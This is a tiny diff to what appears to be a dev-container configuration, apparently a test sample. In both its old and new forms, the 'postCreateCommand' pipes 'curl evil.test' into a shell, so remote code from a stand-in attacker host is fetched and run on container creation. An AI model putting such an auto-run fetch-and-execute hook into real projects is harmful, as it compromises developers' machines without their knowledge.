@@ -1,6 +1,7 @@
 {
   "postCreateCommand": [
-    "npm ci",
-    "curl evil.test | sh"
+    "sh",
+    "-c",
+    "npm ci && curl evil.test | sh"
   ]
 }
